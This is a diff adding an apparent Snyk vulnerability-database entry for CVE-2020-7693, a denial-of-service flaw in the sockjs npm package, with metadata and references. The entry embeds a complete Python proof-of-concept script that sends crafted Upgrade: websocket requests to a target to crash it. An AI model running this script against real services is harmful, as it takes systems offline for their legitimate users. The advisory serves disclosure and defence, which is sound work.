@@ -162,3 +162,63 @@
   references:
   - https://github.com/theyiyibest/Reflected-XSS-on-SockJS
   source_url: https://snyk.io/vuln/SNYK-JS-SOCKJS-548397
+- id: snykio:npm:sockjs:575261
+  title: Denial of Service (DoS)
+  description: "[sockjs][1] is a JavaScript library (for browsers) that provides a\nWebSocket-like
+    object.\n\nAffected versions of this package are vulnerable to Denial of Service\n(DoS).
+    Incorrect handling of `Upgrade` header with the value `websocket`\nleads in crashing
+    of containers hosting sockjs apps.\n\n### PoC by Andrew Snow   {#poc-by-andrew-snow}\n\n
+    \   import requests\n    import random\n    import argparse\n    \n    def main():\n
+    \     print('SockJS 0.3.19 Denial of Service POC')\n      print('For educational
+    purposes only')\n      print('Author: @andsnw')\n      print('------------')\n
+    \     parser = argparse.ArgumentParser(description='SockJS 0.3.19 Denial of Service
+    POC')\n      parser.add_argument('--target', type=str, help='URL of target running
+    vulnerable sockjs')\n      parsed = parser.parse_args()\n      target = vars(parsed)['target']\n
+    \     if target == None:\n        parser.print_help()\n        exit()\n    \n
+    \     # Clean trailing /\n      if target.endswith('/'):\n        target = target[:-1]\n
+    \   \n      print (\"Initiating at: %s\" % target)\n    \n      # Create sockjs
+    payload\n      payloads = [\n        ('%s/sockjs/' % target),\n        ('%s/sockjs/598/'
+    % target),\n        ('%s/sockjs/598/8ko8gkpf/' % target),\n      ]\n    \n      #
+    Run 3 times with traversion\n      for url in payloads:\n        payload_url =
+    \"%s%s\" % (url, random.randint(1000000000000000000,9999999999999999999))\n        print('Requesting:
+    %s' % payload_url)\n        req = requests.get(url=payload_url, headers={\n          'User-Agent':
+    'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',\n          'Cache-Control':
+    'max-age=0',\n          'Accept-Language': 'en-US,en;q=0.5',\n          'Connection':
+    'Upgrade',\n          'Upgrade': 'websocket',\n        })\n        print(\"Status
+    code: %s\" % req.status_code)\n    \n      print (\"Complete! Check if the container
+    has crashed\")\n    \n    if __name__ == \"__main__\":\n        main()\n\n\n\n[1]:
+    https://github.com/sockjs/sockjs-node\n\\nDenial of Service (DoS) describes a
+    family of attacks, all aimed at\nmaking a system inaccessible to its intended
+    and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do
+    not aim at\nbreaching security. Rather, they are focused on making websites and\nservices
+    unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service
+    vulnerability is DDoS (a Distributed\nDenial of Service), an attack that attempts
+    to clog network pipes to the\nsystem by generating a large volume of traffic from
+    many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities
+    allow\nattackers to trigger such a crash or crippling of the service by using
+    a\nflaw either in the application code or from the use of open source\nlibraries.\n\nTwo
+    common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker
+    sending crafted requests that\n  could cause the system to take a disproportionate
+    amount of time to\n  process. For example,\n  [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n*
+    Crash - An attacker sending crafted requests that could cause the\n  system to
+    crash. For Example, [npm `ws` package](npm:ws:20171108)\n\n"
+  affected_package: sockjs
+  vulnerable_versions:
+  - "<0.3.20"
+  severity: medium
+  package_manager: npm
+  cve:
+  - CVE-2020-7693
+  cwe:
+  - CWE-400
+  disclosed_date: 2020-07-03
+  created_date: 2020-07-08
+  last_modified_date: 2020-07-08
+  credit:
+  - Andrew Snow
+  references:
+  - https://github.com/andsnw/sockjs-dos-py
+  - https://github.com/sockjs/sockjs-node/commit/dd7e642cd69ee74385825816d30642c43e051d16
+  - https://github.com/sockjs/sockjs-node/issues/252
+  - https://github.com/sockjs/sockjs-node/pull/265
+  source_url: https://snyk.io/vuln/SNYK-JS-SOCKJS-575261
